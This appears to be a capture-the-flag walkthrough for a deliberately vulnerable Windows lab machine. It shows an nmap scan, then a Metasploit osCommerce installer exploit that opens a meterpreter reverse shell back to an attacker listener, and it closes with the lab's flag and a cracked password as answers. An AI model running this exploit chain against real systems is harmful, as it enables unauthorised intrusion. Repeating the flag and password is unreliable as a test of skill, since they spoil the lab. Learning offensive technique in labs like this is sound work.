# Task 1 Blueprint
----

>>Do you have what is takes to hack into this Windows Machine?

>>It might take around 3-4 minutes for the machine to boot.

----

## SCANNING 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.167.21
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-21 01:49 EST
Nmap scan report for 10.10.167.21
Host is up (0.23s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
|_http-title: Index of /
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:4c:5b:a3:a7:8f (unknown)
| smb2-time: 
|   date: 2022-01-21T06:49:19
|_  start_date: 2022-01-21T06:46:02
|_clock-skew: mean: -2m22s, deviation: 2s, median: -2m24s
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-21T06:49:20+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.36 seconds


```

## GAINING SHELL VIA MSFCONSOLE

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ msfconsole -q
msf6 > search oscommerce

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution
   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/oscommerce_installer_unauth_code_exec

msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting    Required  Description
   ----     ---------------    --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using
                                         -Metasploit
   RPORT    80                 yes       The target port (TCP)
   SSL      false              no        Negotiate SSL/TLS for outgoing connections
   URI      /catalog/install/  yes       The path to the install directory
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set rhosts 10.10.167.21
rhosts => 10.10.167.21
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set rport 8080
rport => 8080
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set lhost 10.9.1.204
lhosts => 10.9.1.204
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install/
URI => /oscommerce-2.3.4/catalog/install/
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting                     Required  Description
   ----     ---------------                     --------  -----------
   Proxies                                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.167.21                        yes       The target host(s), see https://github.com/rapid7/metasploit-fra
                                                          mework/wiki/Using-Metasploit
   RPORT    8080                                yes       The target port (TCP)
   SSL      false                               no        Negotiate SSL/TLS for outgoing connections
   URI      /oscommerce-2.3.4/catalog/install/  yes       The path to the install directory
   VHOST                                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.1.204       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run

[*] Started reverse TCP handler on 10.9.1.204:4444 
[*] Sending stage (39282 bytes) to 10.10.167.21
[*] Meterpreter session 1 opened (10.9.1.204:4444 -> 10.10.167.21:49332 ) at 2022-01-21 02:14:18 -0500

meterpreter > 
meterpreter > ls
Listing: C:\Users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2019-04-11 18:36:40 -0400  AppData
                                                           Application Data
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Contacts
                                                           Cookies
040555/r-xr-xr-x  0       dir   2019-11-27 13:15:52 -0500  Desktop
040555/r-xr-xr-x  4096    dir   2019-04-11 18:36:47 -0400  Documents
040555/r-xr-xr-x  0       dir   2019-04-11 18:45:56 -0400  Downloads
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:48 -0400  Favorites
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Links
                                                           Local Settings
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Music
                                                           My Documents
100666/rw-rw-rw-  786432  fil   2019-04-11 18:36:36 -0400  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2019-04-11 18:38:37 -0400  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf
100666/rw-rw-rw-  524288  fil   2019-04-11 18:38:37 -0400  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer000
                                                           00000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2019-04-11 18:38:37 -0400  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer000
                                                           00000000000000002.regtrans-ms
                                                           NetHood
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Pictures
                                                           PrintHood
                                                           Recent
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Saved Games
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Searches
                                                           SendTo
                                                           Start Menu
                                                           Templates
040555/r-xr-xr-x  0       dir   2019-04-11 18:36:47 -0400  Videos
100666/rw-rw-rw-  262144  fil   2019-04-11 18:36:36 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2019-04-11 18:36:40 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2019-04-11 18:36:40 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-04-11 18:36:47 -0400  desktop.ini
100666/rw-rw-rw-  37    fil   2019-11-27 13:15:37 -0500  root.txt.txt

meterpreter > cat root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}

```

----

# ANSWER THE QUESTIONS :
----

1."Lab" user NTML hash decrypted
>>googleplus

2.root.txt
>>THM{aea1e3ce6fe7f89e10cea833ae009bee}

----